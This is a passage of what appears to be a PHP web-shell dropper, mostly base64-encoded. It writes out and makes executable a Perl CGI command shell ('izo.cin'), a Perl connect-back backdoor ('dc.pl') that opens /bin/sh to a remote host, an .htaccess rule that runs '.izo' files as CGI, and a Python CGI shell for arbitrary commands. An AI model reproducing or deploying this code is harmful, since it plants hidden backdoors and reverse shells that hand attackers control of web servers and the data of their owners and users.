UJpWlNCa2IzZHViRzloWkdWa0xnMEtJeUJVYUdseklHWjFibU4wYVc5dUlHbHpJR0ZzYzI4Z1kyRnNiR1ZrSUhkb1pXNGdkR2hsSUhWelpYSWdZMnhwWTJ0eklHOXVJSFJvWVhRZ2JHbHVheTRnU1c0Z2RHaHBjeUJqWVhObExBMEtJeUIwYUdVZ1ptbHNaU0JwY3lCeVpXRmtJR0Z1WkNCelpXNTBJSFJ2SUhSb1pTQmljbTkzYzJWeUxnMEtJeTB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtjM1ZpSUVKbFoybHVSRzkzYm14dllXUU5DbnNOQ2draklHZGxkQ0JtZFd4c2VTQnhkV0ZzYVdacFpXUWdjR0YwYUNCdlppQjBhR1VnWm1sc1pTQjBieUJpWlNCa2IzZHViRzloWkdWa0RRb0phV1lvS0NSWGFXNU9WQ0FtSUNna1ZISmhibk5tWlhKR2FXeGxJRDErSUcwdlhseGNmRjR1T2k4cEtTQjhEUW9KQ1NnaEpGZHBiazVVSUNZZ0tDUlVjbUZ1YzJabGNrWnBiR1VnUFg0Z2JTOWVYQzh2S1NrcElDTWdjR0YwYUNCcGN5QmhZbk52YkhWMFpRMEtDWHNOQ2drSkpGUmhjbWRsZEVacGJHVWdQU0FrVkhKaGJuTm1aWEpHYVd4bE93MEtDWDBOQ2dsbGJITmxJQ01nY0dGMGFDQnBjeUJ5Wld4aGRHbDJaUTBLQ1hzTkNna0pZMmh2Y0Nna1ZHRnlaMlYwUm1sc1pTa2dhV1lvSkZSaGNtZGxkRVpwYkdVZ1BTQWtRM1Z5Y21WdWRFUnBjaWtnUFg0Z2JTOWJYRnhjTDEwa0x6c05DZ2tKSkZSaGNtZGxkRVpwYkdVZ0xqMGdKRkJoZEdoVFpYQXVKRlJ5WVc1elptVnlSbWxzWlRzTkNnbDlEUW9OQ2dscFppZ2tUM0IwYVc5dWN5QmxjU0FpWjI4aUtTQWpJSGRsSUdoaGRtVWdkRzhnYzJWdVpDQjBhR1VnWm1sc1pRMEtDWHNOQ2drSkpsTmxibVJHYVd4bFZHOUNjbTkzYzJWeUtDUlVZWEpuWlhSR2FXeGxLVHNOQ2dsOURRb0paV3h6WlNBaklIZGxJR2hoZG1VZ2RHOGdjMlZ1WkNCdmJteDVJSFJvWlNCc2FXNXJJSEJoWjJVTkNnbDdEUW9KQ1NaUWNtbHVkRVJ2ZDI1c2IyRmtUR2x1YTFCaFoyVW9KRlJoY21kbGRFWnBiR1VwT3cwS0NYME5DbjBOQ2cwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS0l5QlVhR2x6SUdaMWJtTjBhVzl1SUdseklHTmhiR3hsWkNCM2FHVnVJSFJvWlNCMWMyVnlJSGRoYm5SeklIUnZJSFZ3Ykc5aFpDQmhJR1pwYkdVdUlFbG1JSFJvWlEwS0l5Qm1hV3hsSUdseklHNXZkQ0J6Y0dWamFXWnBaV1FzSUdsMElHUnBjM0JzWVhseklHRWdabTl5YlNCaGJHeHZkMmx1WnlCMGFHVWdkWE5sY2lCMGJ5QnpjR1ZqYVdaNUlHRU5DaU1nWm1sc1pTd2diM1JvWlhKM2FYTmxJR2wwSUhOMFlYSjBjeUIwYUdVZ2RYQnNiMkZrSUhCeWIyTmxjM011RFFvakxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0RFFwemRXSWdWWEJzYjJGa1JtbHNaUTBLZXcwS0NTTWdhV1lnYm04Z1ptbHNaU0JwY3lCemNHVmphV1pwWldRc0lIQnlhVzUwSUhSb1pTQjFjR3h2WVdRZ1ptOXliU0JoWjJGcGJnMEtDV2xtS0NSVWNtRnVjMlpsY2tacGJHVWdaWEVnSWlJcERRb0pldzBLQ1FrbVVISnBiblJRWVdkbFNHVmhaR1Z5S0NKbUlpazdEUW9KQ1NaUWNtbHVkRVpwYkdWVmNHeHZZV1JHYjNKdE93MEtDUWttVUhKcGJuUlFZV2RsUm05dmRHVnlPdzBLQ1FseVpYUjFjbTQ3RFFvSmZRMEtDU1pRY21sdWRGQmhaMlZJWldGa1pYSW9JbU1pS1RzTkNnMEtDU01nYzNSaGNuUWdkR2hsSUhWd2JHOWhaR2x1WnlCd2NtOWpaWE56RFFvSmNISnBiblFnSWxWd2JHOWhaR2x1WnlBa1ZISmhibk5tWlhKR2FXeGxJSFJ2SUNSRGRYSnlaVzUwUkdseUxpNHVQR0p5UGlJN0RRb05DZ2tqSUdkbGRDQjBhR1VnWm5Wc2JHeDVJSEYxWVd4cFptbGxaQ0J3WVhSb2JtRnRaU0J2WmlCMGFHVWdabWxzWlNCMGJ5QmlaU0JqY21WaGRHVmtEUW9KWTJodmNDZ2tWR0Z5WjJWMFRtRnRaU2tnYVdZZ0tDUlVZWEpuWlhST1lXMWxJRDBnSkVOMWNuSmxiblJFYVhJcElEMStJRzB2VzF4Y1hDOWRKQzg3RFFvSkpGUnlZVzV6Wm1WeVJtbHNaU0E5ZmlCdElTaGJYaTllWEZ4ZEtpa2tJVHNOQ2dra1ZHRnlaMlYwVG1GdFpTQXVQU0FrVUdGMGFGTmxjQzRrTVRzTkNnMEtDU1JVWVhKblpYUkdhV3hsVTJsNlpTQTlJR3hsYm1kMGFDZ2thVzU3SjJacGJHVmtZWFJoSjMwcE93MEtDU01nYVdZZ2RHaGxJR1pwYkdVZ1pYaHBjM1J6SUdGdVpDQjNaU0JoY21VZ2JtOTBJSE4xY0hCdmMyVmtJSFJ2SUc5MlpYSjNjbWwwWlNCcGRBMEtDV2xtS0MxbElDUlVZWEpuWlhST1lXMWxJQ1ltSUNSUGNIUnBiMjV6SUc1bElDSnZkbVZ5ZDNKcGRHVWlLUTBLQ1hzTkNna0pjSEpwYm5RZ0lrWmhhV3hsWkRvZ1JHVnpkR2x1WVhScGIyNGdabWxzWlNCaGJISmxZV1I1SUdWNGFYTjBjeTQ4WW5JK0lqc05DZ2w5RFFvSlpXeHpaU0FqSUdacGJHVWdhWE1nYm05MElIQnlaWE5sYm5RTkNnbDdEUW9KQ1dsbUtHOXdaVzRvVlZCTVQwRkVSa2xNUlN3Z0lqNGtWR0Z5WjJWMFRtRnRaU0lwS1EwS0NRbDdEUW9KQ1FsaWFXNXRiMlJsS0ZWUVRFOUJSRVpKVEVVcElHbG1JQ1JYYVc1T1ZEc05DZ2tKQ1hCeWFXNTBJRlZRVEU5QlJFWkpURVVnSkdsdWV5ZG1hV3hsWkdGMFlTZDlPdzBLQ1FrSlkyeHZjMlVvVlZCTVQwRkVSa2xNUlNrN0RRb0pDUWx3Y21sdWRDQWlWSEpoYm5ObVpYSmxaQ0FrVkdGeVoyVjBSbWxzWlZOcGVtVWdRbmwwWlhNdVBHSnlQaUk3RFFvSkNRbHdjbWx1ZENBaVJtbHNaU0JRWVhSb09pQWtWR0Z5WjJWMFRtRnRaVHhpY2o0aU93MEtDUWw5RFFvSkNXVnNjMlVOQ2drSmV3MEtDUWtKY0hKcGJuUWdJa1poYVd4bFpEb2dKQ0U4WW5JK0lqc05DZ2tKZlEwS0NYME5DZ2x3Y21sdWRDQWlJanNOQ2drbVVISnBiblJEYjIxdFlXNWtUR2x1WlVsdWNIVjBSbTl5YlRzTkNnMEtDU1pRY21sdWRGQmhaMlZHYjI5MFpYSTdEUXA5RFFvTkNpTXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwTkNpTWdWR2hwY3lCbWRXNWpkR2x2YmlCcGN5QmpZV3hzWldRZ2QyaGxiaUIwYUdVZ2RYTmxjaUIzWVc1MGN5QjBieUJrYjNkdWJHOWhaQ0JoSUdacGJHVXVJRWxtSUhSb1pRMEtJeUJtYVd4bGJtRnRaU0JwY3lCdWIzUWdjM0JsWTJsbWFXVmtMQ0JwZENCa2FYTndiR0Y1Y3lCaElHWnZjbTBnWVd4c2IzZHBibWNnZEdobElIVnpaWElnZEc4Z2MzQmxZMmxtZVNCaERRb2pJR1pwYkdVc0lHOTBhR1Z5ZDJselpTQnBkQ0JrYVhOd2JHRjVjeUJoSUcxbGMzTmhaMlVnZEc4Z2RHaGxJSFZ6WlhJZ1lXNWtJSEJ5YjNacFpHVnpJR0VnYkdsdWF3MEtJeUIwYUhKdmRXZG9JQ0IzYUdsamFDQjBhR1VnWm1sc1pTQmpZVzRnWW1VZ1pHOTNibXh2WVdSbFpDNE5DaU10TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTME5Dbk4xWWlCRWIzZHViRzloWkVacGJHVU5DbnNOQ2draklHbG1JRzV2SUdacGJHVWdhWE1nYzNCbFkybG1hV1ZrTENCd2NtbHVkQ0IwYUdVZ1pHOTNibXh2WVdRZ1ptOXliU0JoWjJGcGJnMEtDV2xtS0NSVWNtRnVjMlpsY2tacGJHVWdaWEVnSWlJcERRb0pldzBLQ1FrbVVISnBiblJRWVdkbFNHVmhaR1Z5S0NKbUlpazdEUW9KQ1NaUWNtbHVkRVpwYkdWRWIzZHViRzloWkVadmNtMDdEUW9KQ1NaUWNtbHVkRkJoWjJWR2IyOTBaWEk3RFFvSkNYSmxkSFZ5YmpzTkNnbDlEUW9KRFFvSkl5Qm5aWFFnWm5Wc2JIa2djWFZoYkdsbWFXVmtJSEJoZEdnZ2IyWWdkR2hsSUdacGJHVWdkRzhnWW1VZ1pHOTNibXh2WVdSbFpBMEtDV2xtS0Nna1YybHVUbFFnSmlBb0pGUnlZVzV6Wm1WeVJtbHNaU0E5ZmlCdEwxNWNYSHhlTGpvdktTa2dmQTBLQ1Frb0lTUlhhVzVPVkNBbUlDZ2tWSEpoYm5ObVpYSkdhV3hsSUQxK0lHMHZYbHd2THlrcEtTQWpJSEJoZEdnZ2FYTWdZV0p6YjJ4MWRHVU5DZ2w3RFFvSkNTUlVZWEpuWlhSR2FXeGxJRDBnSkZSeVlXNXpabVZ5Um1sc1pUc05DZ2w5RFFvSlpXeHpaU0FqSUhCaGRHZ2dhWE1nY21Wc1lYUnBkbVVOQ2dsN0RRb0pDV05vYjNBb0pGUmhjbWRsZEVacGJHVXBJR2xtS0NSVVlYSm5aWFJHYVd4bElEMGdKRU4xY25KbGJuUkVhWElwSUQxK0lHMHZXMXhjWEM5ZEpDODdEUW9KQ1NSVVlYSm5aWFJHYVd4bElDNDlJQ1JRWVhSb1UyVndMaVJVY21GdWMyWmxja1pwYkdVN0RRb0pmUTBLRFFvSmFXWW9KRTl3ZEdsdmJuTWdaWEVnSW1kdklpa2dJeUIzWlNCb1lYWmxJSFJ2SUhObGJtUWdkR2hsSUdacGJHVU5DZ2w3RFFvSkNTWlRaVzVrUm1sc1pWUnZRbkp2ZDNObGNpZ2tWR0Z5WjJWMFJtbHNaU2s3RFFvSmZRMEtDV1ZzYzJVZ0l5QjNaU0JvWVhabElIUnZJSE5sYm1RZ2IyNXNlU0IwYUdVZ2JHbHVheUJ3WVdkbERRb0pldzBLQ1FrbVVISnBiblJFYjNkdWJHOWhaRXhwYm10UVlXZGxLQ1JVWVhKblpYUkdhV3hsS1RzTkNnbDlEUXA5RFFvTkNpTXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwTkNpTWdUV0ZwYmlCUWNtOW5jbUZ0SUMwZ1JYaGxZM1YwYVc5dUlGTjBZWEowY3lCSVpYSmxEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUW9tVW1WaFpGQmhjbk5sT3cwS0prZGxkRU52YjJ0cFpYTTdEUW9OQ2lSVFkzSnBjSFJNYjJOaGRHbHZiaUE5SUNSRlRsWjdKMU5EVWtsUVZGOU9RVTFGSjMwN0RRb2tVMlZ5ZG1WeVRtRnRaU0E5SUNSRlRsWjdKMU5GVWxaRlVsOU9RVTFGSjMwN0RRb2tURzluYVc1UVlYTnpkMjl5WkNBOUlDUnBibnNuY0NkOU93MEtKRkoxYmtOdmJXMWhibVFnUFNBa2FXNTdKMk1uZlRzTkNpUlVjbUZ1YzJabGNrWnBiR1VnUFNBa2FXNTdKMlluZlRzTkNpUlBjSFJwYjI1eklEMGdKR2x1ZXlkdkozMDdEUW9OQ2lSQlkzUnBiMjRnUFNBa2FXNTdKMkVuZlRzTkNpUkJZM1JwYjI0Z1BTQWliRzluYVc0aUlHbG1LQ1JCWTNScGIyNGdaWEVnSWlJcE95QWpJRzV2SUdGamRHbHZiaUJ6Y0dWamFXWnBaV1FzSUhWelpTQmtaV1poZFd4MERRb05DaU1nWjJWMElIUm9aU0JrYVhKbFkzUnZjbmtnYVc0Z2QyaHBZMmdnZEdobElHTnZiVzFoYm1SeklIZHBiR3dnWW1VZ1pYaGxZM1YwWldRTkNpUkRkWEp5Wlc1MFJHbHlJRDBnSkdsdWV5ZGtKMzA3RFFwamFHOXdLQ1JEZFhKeVpXNTBSR2x5SUQwZ1lDUkRiV1JRZDJSZ0tTQnBaaWdrUTNWeWNtVnVkRVJwY2lCbGNTQWlJaWs3RFFvTkNpUk1iMmRuWldSSmJpQTlJQ1JEYjI5cmFXVnpleWRUUVZaRlJGQlhSQ2Q5SUdWeElDUlFZWE56ZDI5eVpEc05DZzBLYVdZb0pFRmpkR2x2YmlCbGNTQWliRzluYVc0aUlIeDhJQ0VrVEc5bloyVmtTVzRwSUNNZ2RYTmxjaUJ1WldWa2N5OW9ZWE1nZEc4Z2JHOW5hVzROQ25zTkNna21VR1Z5Wm05eWJVeHZaMmx1T3cwS0RRcDlEUXBsYkhOcFppZ2tRV04wYVc5dUlHVnhJQ0pqYjIxdFlXNWtJaWtnSXlCMWMyVnlJSGRoYm5SeklIUnZJSEoxYmlCaElHTnZiVzFoYm1RTkNuc05DZ2ttUlhobFkzVjBaVU52YlcxaGJtUTdEUXA5RFFwbGJITnBaaWdrUVdOMGFXOXVJR1Z4SUNKMWNHeHZZV1FpS1NBaklIVnpaWElnZDJGdWRITWdkRzhnZFhCc2IyRmtJR0VnWm1sc1pRMEtldzBLQ1NaVmNHeHZZV1JHYVd4bE93MEtmUTBLWld4emFXWW9KRUZqZEdsdmJpQmxjU0FpWkc5M2JteHZZV1FpS1NBaklIVnpaWElnZDJGdWRITWdkRzhnWkc5M2JteHZZV1FnWVNCbWFXeGxEUXA3RFFvSkprUnZkMjVzYjJGa1JtbHNaVHNOQ24wTkNtVnNjMmxtS0NSQlkzUnBiMjRnWlhFZ0lteHZaMjkxZENJcElDTWdkWE5sY2lCM1lXNTBjeUIwYnlCc2IyZHZkWFFOQ25zTkNna21VR1Z5Wm05eWJVeHZaMjkxZERzTkNuMD0nOw0KDQokZmlsZSA9IGZvcGVuKCJpem8uY2luIiAsIncrIik7DQokd3JpdGUgPSBmd3JpdGUgKCRmaWxlICxiYXNlNjRfZGVjb2RlKCRjZ2lzaGVsbGl6b2NpbikpOw0KZmNsb3NlKCRmaWxlKTsNCiAgICBjaG1vZCgiaXpvLmNpbiIsMDc1NSk7DQokbmV0Y2F0c2hlbGwgPSAnSXlFdmRYTnlMMkpwYmk5d1pYSnNEUW9nSUNBZ0lDQjFjMlVnVTI5amEyVjBPdzBLSUNBZ0lDQWdjSEpwYm5RZ0lrUmhkR0VnUTJoaA0KTUhNZ1EyOXVibVZqZENCQ1lXTnJJRUpoWTJ0a2IyOXlYRzVjYmlJN0RRb2dJQ0FnSUNCcFppQW9JU1JCVWtkV1d6QmRLU0I3RFFvZw0KSUNBZ0lDQWdJSEJ5YVc1MFppQWlWWE5oWjJVNklDUXdJRnRJYjNOMFhTQThVRzl5ZEQ1Y2JpSTdEUW9nSUNBZ0lDQWdJR1Y0YVhRbw0KTVNrN0RRb2dJQ0FnSUNCOURRb2dJQ0FnSUNCd2NtbHVkQ0FpV3lwZElFUjFiWEJwYm1jZ1FYSm5kVzFsYm5SelhHNGlPdzBLSUNBZw0KSUNBZ0pHaHZjM1FnUFNBa1FWSkhWbHN3WFRzTkNpQWdJQ0FnSUNSd2IzSjBJRDBnT0RBN0RRb2dJQ0FnSUNCcFppQW9KRUZTUjFaYg0KTVYwcElIc05DaUFnSUNBZ0lDQWdKSEJ2Y25RZ1BTQWtRVkpIVmxzeFhUc05DaUFnSUNBZ0lIME5DaUFnSUNBZ0lIQnlhVzUwSUNKYg0KS2wwZ1EyOXVibVZqZEdsdVp5NHVMbHh1SWpzTkNpQWdJQ0FnSUNSd2NtOTBieUE5SUdkbGRIQnliM1J2WW5sdVlXMWxLQ2QwWTNBbg0KS1NCOGZDQmthV1VvSWxWdWEyNXZkMjRnVUhKdmRHOWpiMnhjYmlJcE93MEtJQ0FnSUNBZ2MyOWphMlYwS0ZORlVsWkZVaXdnVUVaZg0KU1U1RlZDd2dVMDlEUzE5VFZGSkZRVTBzSUNSd2NtOTBieWtnZkh3Z1pHbGxJQ2dpVTI5amEyVjBJRVZ5Y205eVhHNGlLVHNOQ2lBZw0KSUNBZ0lHMTVJQ1IwWVhKblpYUWdQU0JwYm1WMFgyRjBiMjRvSkdodmMzUXBPdzBLSUNBZ0lDQWdhV1lnS0NGamIyNXVaV04wS0ZORg0KVWxaRlVpd2djR0ZqYXlBaVUyNUJOSGc0SWl3Z01pd2dKSEJ2Y25Rc0lDUjBZWEpuWlhRcEtTQjdEUW9nSUNBZ0lDQWdJR1JwWlNnaQ0KVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1JjYmlJcE93MEtJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ2NISnBiblFnSWxzcVhTQlRjR0YzYm1sdQ0KWnlCVGFHVnNiRnh1SWpzTkNpQWdJQ0FnSUdsbUlDZ2habTl5YXlnZ0tTa2dldzBLSUNBZ0lDQWdJQ0J2Y0dWdUtGTlVSRWxPTENJKw0KSmxORlVsWkZVaUlwT3cwS0lDQWdJQ0FnSUNCdmNHVnVLRk5VUkU5VlZDd2lQaVpUUlZKV1JWSWlLVHNOQ2lBZ0lDQWdJQ0FnYjNCbA0KYmloVFZFUkZVbElzSWo0bVUwVlNWa1ZTSWlrN0RRb2dJQ0FnSUNBZ0lHVjRaV01nZXljdlltbHVMM05vSjMwZ0p5MWlZWE5vSnlBdQ0KSUNKY01DSWdlQ0EwT3cwS0lDQWdJQ0FnSUNCbGVHbDBLREFwT3cwS0lDQWdJQ0FnZlEwS0lDQWdJQ0FnY0hKcGJuUWdJbHNxWFNCRQ0KWVhSaFkyaGxaRnh1WEc0aU93PT0nOw0KDQokZmlsZSA9IGZvcGVuKCJkYy5wbCIgLCJ3KyIpOw0KJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkbmV0Y2F0c2hlbGwpKTsNCmZjbG9zZSgkZmlsZSk7DQogICAgY2htb2QoImRjLnBsIiwwNzU1KTsNCmVjaG8gImh0dHA6Ly9jZ2lzaGVsbC9pem8uY2luICI7DQp9DQppZiAoaXNzZXQoJF9QT1NUWydTdWJtaXQxNCddKSkNCnsNCiAgICBta2RpcigncHl0aG9uJywgMDc1NSk7DQogICAgY2hkaXIoJ3B5dGhvbicpOw0KICAgICAgICAka29rZG9zeWEgPSAiLmh0YWNjZXNzIjsNCiAgICAgICAgJGRvc3lhX2FkaSA9ICIka29rZG9zeWEiOw0KICAgICAgICAkZG9zeWEgPSBmb3BlbiAoJGRvc3lhX2FkaSAsICd3Jykgb3IgZGllICgiRG9zeWEgYcOnxLFsYW1hZMSxISIpOw0KICAgICAgICAkbWV0aW4gPSAiQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5pem8iOyAgICANCiAgICAgICAgZndyaXRlICggJGRvc3lhICwgJG1ldGluICkgOw0KICAgICAgICBmY2xvc2UgKCRkb3N5YSk7DQokcHl0aG9ucCA9ICdJeUV2ZFhOeUwySnBiaTl3ZVhSb2IyNEtJeUF3Tnkwd055MHdOQW9qSUhZeExqQXVNQW9LSXlCaloya3RjMmhsYkd3dWNIa0tJeUJCDQpJSE5wYlhCc1pTQkRSMGtnZEdoaGRDQmxlR1ZqZFhSbGN5QmhjbUpwZEhKaGNua2djMmhsYkd3Z1kyOXRiV0Z1WkhNdUNnb0tJeUJEDQpiM0I1Y21sbmFIUWdUV2xqYUdGbGJDQkdiMjl5WkFvaklGbHZkU0JoY21VZ1puSmxaU0IwYnlCdGIyUnBabmtzSUhWelpTQmhibVFnDQpjbVZzYVdObGJuTmxJSFJvYVhNZ1kyOWtaUzRLQ2lNZ1RtOGdkMkZ5Y21GdWRIa2daWGh3Y21WemN5QnZjaUJwYlhCc2FXVmtJR1p2DQpjaUIwYUdVZ1lXTmpkWEpoWTNrc0lHWnBkRzVsYzNNZ2RHOGdjSFZ5Y0c5elpTQnZjaUJ2ZEdobGNuZHBjMlVnWm05eUlIUm9hWE1nDQpZMjlrWlM0dUxpNEtJeUJWYzJVZ1lYUWdlVzkxY2lCdmQyNGdjbWx6YXlBaElTRUtDaU1nUlMxdFlXbHNJRzFwWTJoaFpXd2dRVlFnDQpabTl2Y21RZ1JFOVVJRzFsSUVSUFZDQjFhd29qSUUxaGFXNTBZV2x1WldRZ1lYUWdkM2QzTG5admFXUnpjR0ZqWlM1dmNtY3VkV3N2DQpZWFJzWVc1MGFXSnZkSE12Y0hsMGFHOXVkWFJwYkhNdWFIUnRiQW9LSWlJaUNrRWdjMmx0Y0d4bElFTkhTU0J6WTNKcGNIUWdkRzhnDQpaWGhsWTNWMFpTQnphR1ZzYkNCamIyMXRZVzVrY3lCMmFXRWdRMGRKTGdvaUlpSUtJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qDQpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl3b2pJRWx0Y0c5eWRITUtkSEo1DQpPZ29nSUNBZ2FXMXdiM0owSUdObmFYUmlPeUJqWjJsMFlpNWxibUZpYkdVb0tRcGxlR05sY0hRNkNpQWdJQ0J3WVhOekNtbHRjRzl5DQpkQ0J6ZVhNc0lHTm5hU3dnYjNNS2MzbHpMbk4wWkdWeWNpQTlJSE41Y3k1emRHUnZkWFFLWm5KdmJTQjBhVzFsSUdsdGNHOXlkQ0J6DQpkSEptZEdsdFpRcHBiWEJ2Y25RZ2RISmhZMlZpWVdOckNtWnliMjBnVTNSeWFXNW5TVThnYVcxd2IzSjBJRk4wY21sdVowbFBDbVp5DQpiMjBnZEhKaFkyVmlZV05ySUdsdGNHOXlkQ0J3Y21sdWRGOWxlR01LQ2lNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qDQpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1LSXlCamIyNXpkR0Z1ZEhNS0NtWnZiblJzDQphVzVsSUQwZ0p6eEdUMDVVSUVOUFRFOVNQU00wTWpReU5ESWdjM1I1YkdVOUltWnZiblF0Wm1GdGFXeDVPblJwYldWek8yWnZiblF0DQpjMmw2WlRveE1uQjBPeUkrSndwMlpYSnphVzl1YzNSeWFXNW5JRDBnSjFabGNuTnBiMjRnTVM0d0xqQWdOM1JvSUVwMWJIa2dNakF3DQpOQ2NLQ21sbUlHOXpMbVZ1ZG1seWIyNHVhR0Z6WDJ0bGVTZ2lVME5TU1ZCVVgwNUJUVVVpS1RvS0lDQWdJSE5qY21sd2RHNWhiV1VnDQpQU0J2Y3k1bGJuWnBjbTl1V3lKVFExSkpVRlJmVGtGTlJTSmRDbVZzYzJVNkNpQWdJQ0J6WTNKcGNIUnVZVzFsSUQwZ0lpSUtDazFGDQpWRWhQUkNBOUlDY2lVRTlUVkNJbkNnb2pJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qDQpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakNpTWdVSEpwZG1GMFpTQm1kVzVqZEdsdmJuTWdZVzVrSUhaaGNtbGhZbXhsDQpjd29LWkdWbUlHZGxkR1p2Y20wb2RtRnNkV1ZzYVhOMExDQjBhR1ZtYjNKdExDQnViM1J3Y21WelpXNTBQU2NuS1RvS0lDQWdJQ0lpDQpJbFJvYVhNZ1puVnVZM1JwYjI0c0lHZHBkbVZ1SUdFZ1EwZEpJR1p2Y20wc0lHVjRkSEpoWTNSeklIUm9aU0JrWVhSaElHWnliMjBnDQphWFFzSUdKaGMyVmtJRzl1Q2lBZ0lDQjJZV3gxWld4cGMzUWdjR0Z6YzJWa0lHbHVMaUJCYm5rZ2JtOXVMWEJ5WlhObGJuUWdkbUZzDQpkV1Z6SUdGeVpTQnpaWFFnZEc4Z0p5Y2dMU0JoYkhSb2IzVm5hQ0IwYUdseklHTmhiaUJpWlNCamFHRnVaMlZrTGdvZ0lDQWdLR1V1DQpaeTRnZEc4Z2NtVjBkWEp1SUU1dmJtVWdjMjhnZVc5MUlHTmhiaUIwWlhOMElHWnZjaUJ0YVhOemFXNW5JR3RsZVhkdmNtUnpJQzBnDQpkMmhsY21VZ0p5Y2dhWE1nWVNCMllXeHBaQ0JoYm5OM1pYSWdZblYwSUhSdklHaGhkbVVnZEdobElHWnBaV3hrSUcxcGMzTnBibWNnDQphWE51SjNRdUtTSWlJZ29nSUNBZ1pHRjBZU0E5SUh0OUNpQWdJQ0JtYjNJZ1ptbGxiR1FnYVc0Z2RtRnNkV1ZzYVhOME9nb2dJQ0FnDQpJQ0FnSUdsbUlHNXZkQ0IwYUdWbWIzSnRMbWhoYzE5clpYa29abWxsYkdRcE9nb2dJQ0FnSUNBZ0lDQWdJQ0JrWVhSaFcyWnBaV3hrDQpYU0E5SUc1dmRIQnlaWE5sYm5RS0lDQWdJQ0FnSUNCbGJITmxPZ29nSUNBZ0lDQWdJQ0FnSUNCcFppQWdkSGx3WlNoMGFHVm1iM0p0DQpXMlpwWld4a1hTa2dJVDBnZEhsd1pTaGJYU2s2Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JrWVhSaFcyWnBaV3hrWFNBOUlIUm9aV1p2DQpjbTFiWm1sbGJHUmRMblpoYkhWbENpQWdJQ0FnSUNBZ0lDQWdJR1ZzYzJVNkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCMllXeDFaWE1nDQpQU0J0WVhBb2JHRnRZbVJoSUhnNklIZ3VkbUZzZFdVc0lIUm9aV1p2Y20xYlptbGxiR1JkS1NBZ0lDQWdJeUJoYkd4dmQzTWdabTl5DQpJR3hwYzNRZ2RIbHdaU0IyWVd4MVpYTUtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lHUmhkR0ZiWm1sbGJHUmRJRDBnZG1Gc2RXVnpDaUFnDQpJQ0J5WlhSMWNtNGdaR0YwWVFvS0NuUm9aV1p2Y20xb1pXRmtJRDBnSWlJaVBFaFVUVXcrUEVoRlFVUStQRlJKVkV4RlBtTm5hUzF6DQphR1ZzYkM1d2VTQXRJR0VnUTBkSklHSjVJRVoxZW5wNWJXRnVQQzlVU1ZSTVJUNDhMMGhGUVVRK0NqeENUMFJaUGp4RFJVNVVSVkkrDQpDanhJTVQ1WFpXeGpiMjFsSUhSdklHTm5hUzF6YUdWc2JDNXdlU0F0SUR4Q1VqNWhJRkI1ZEdodmJpQkRSMGs4TDBneFBnbzhRajQ4DQpTVDVDZVNCR2RYcDZlVzFoYmp3dlFqNDhMMGsrUEVKU1Bnb2lJaUlyWm05dWRHeHBibVVnS3lKV1pYSnphVzl1SURvZ0lpQXJJSFpsDQpjbk5wYjI1emRISnBibWNnS3lBaUlpSXNJRkoxYm01cGJtY2diMjRnT2lBaUlpSWdLeUJ6ZEhKbWRHbHRaU2duSlVrNkpVMGdKWEFzDQpJQ1ZCSUNWa0lDVkNMQ0FsV1NjcEt5Y3VQQzlEUlU1VVJWSStQRUpTUGljS0NuUm9aV1p2Y20wZ1BTQWlJaUk4U0RJK1JXNTBaWElnDQpRMjl0YldGdVpEd3ZTREkrQ2p4R1QxSk5JRTFGVkVoUFJEMWNJaUlpSWlBcklFMUZWRWhQUkNBcklDY2lJR0ZqZEdsdmJqMGlKeUFyDQpJSE5qY21sd2RHNWhiV1VnS3lBaUlpSmNJajRLUEdsdWNIVjBJRzVoYldVOVkyMWtJSFI1Y0dVOWRHVjRkRDQ4UWxJK0NqeHBibkIxDQpkQ0IwZVhCbFBYTjFZbTFwZENCMllXeDFaVDBpVTNWaWJXbDBJajQ4UWxJK0Nqd3ZSazlTVFQ0OFFsSStQRUpTUGlJaUlncGliMlI1DQpaVzVrSUQwZ0p6d3ZRazlFV1Q0OEwwaF